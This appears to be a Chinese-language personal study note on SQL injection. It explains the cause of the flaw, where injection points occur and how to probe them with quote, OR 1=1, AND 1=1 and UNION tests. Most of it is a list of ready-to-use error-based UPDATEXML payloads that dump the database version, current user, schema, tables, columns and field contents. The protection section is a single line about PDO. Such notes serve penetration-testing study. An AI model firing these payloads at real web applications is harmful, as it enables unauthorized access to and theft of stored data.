零 SQL操作







一 漏洞成因（原理）
（一）把用户输入直接放进了SQL语句里，而没有进行任何检测和限制。



（二）可没有检测为什么就会产生问题呢？
1 一个关于字符串注入的实例
比如：SELECT * FROM sqlinject.sql WHERE username=''，
正常情况下：用户在前端输入一个wy作为username来进行select，但是，
你可以这样输入：
wy' OR 1=1#
也可以：wy' OR 1=1--+

2 通过实例你会发现，其实很简单，就是三点：
（1）用'作为开始'的结束，以闭合合法区域；
（2）插入个人语句；
（3）用#注释掉结束'。







二 测试思路
（一）明确注入点：注入点只要是前端的数据和后端的数据库发生交互那么就存在SQL注入点。
0 一般你在页面上就能看出来，如果看不出来也可以试试JSON、cookie。

1 数据在URI还是POST还是头，实际上GET还是POST不影响实际攻击效果，但是要注意的是：
（1）注入点实际在的位置：GET方法的数据在URI处（可以在URL里构造也可以使用bp改）、POST方法的数据在体里（只能在bp里改，一般的浏览器不行，老版Firefox也行，但新版你得去找免费的hackerbar）、请求头也可以有注入比如cookie注入。
（2）URL编码问题：
a 在GET中：
#后面不需要空格，--后面需要空格。
空格 == +
# == %23
b 在POST中无所谓。



（二）设计poc并测试：
1 看两点（会影响测试手法）
（1）关键是看这个点是什么类型。
基本类型：
数字
字符
搜索：使用%进行通配：
xx：使用)闭合(
高级类型：
（2）功能是增删查改还是什么。

2 测试手法：详见下面。







三 测试手法
（一）初级（不一定非得得到明确的正向结果，只要报错那说明就有戏）
1 引号测试（仅适用于字符串类型，这叫字符型注入）
比如：SELECT * FROM sqlinject.sql WHERE username=''，
正常情况下：用户在前端输入一个wy作为username来进行select，
你可以输入：wy'，注意：也可以用双引，
如果报错，则说明是存在SQL注入漏洞，
如果没有报错，则：
如果查到了（0.01%的可能）说明必然没有SQL注入，那么说明后端必然进行了PDO检查且确实存在wy'这个username，
如果没有查到，
有可能是后端检查了且没有wy'这个username，那就是没有，也有可能是存在SQL注入但后端SQL语句使用的引号是"而不是'，导致没有查到，那就可以使用双引号再试一下，
然后循环。

2 or 1=1（适用于任何数据，数字型注入的话无需引号直接or 1=1就行。如果是字符型，那就wy' or 1=1#）
如果能爆出来所有记录，那么说明必存在SQL注入漏洞。
如果不能爆出所有记录而是找不到（99.9%肯定是没有）或出错（另有玄机）。

3 and 1=1（适用于任何数据，数字型注入的话无需引号）
如果能正常拿到该记录，那么说明99.9%存在SQL注入漏洞，0.01%是真有”正常查询值 and 1=1“这条记录且说明做了检查，你可以再用and 1=2（用来辅助，不能测试有没有SQL注入因为有没有它都是查不到）试一下如果查不到则确定有SQL注入。
如果不能拿到记录，如果是语法出错，那么另有玄机，如果是找不到，那么说明凉了。

4 联合查询（上面都是用来查询单表信息，这个用来查询其他表的信息）：
union select version();
查到说明有，查不到说明没有。



（二）高级（拿到一些信息，目前来看：高级 == 报错注入 == UPDATEXML）
0 其基本思路是报错注入，主要会使用到一些函数
（1）UPDATEXML(xml_data, xpath_expr, new_value)
返回值：更新后的XML数据。
参数：
xml_data: 原始的 XML 数据，通常是一个 XML 文档的字符串。
xpath_expr: XPath 表达式，用于指定要更新 XML 数据的路径。
new_value: 用于替换指定 XPath 路径上的现有数据的新值。

1 爆数据库版本信息：
wy' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#

2 爆数据库当前用户：
wy' and updatexml(1,concat(0x7e,(SELECT USER()),0x7e),1)#

3 爆某数据库名
wy' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#

4 爆某数据库表名
wy' and updatexml(1,concat(0x7e,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='daname' limit offset,1),0x7e),0)#
注：daname和offset要替换。

5 爆字段名
wy' and updatexml(1,concat(0x7e,(SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='tbname' limit offset,1),0x7e),1)#
注：tbname和offset要换。

6 爆字段内容
wy' and updatexml(1,concat(0x7e,(正常查询),0x7e),1)#
注：很多时候也会遇到行数限制，所以要巧用limit。







四 防护方法
1 pdo：就是整个给你作为参数。


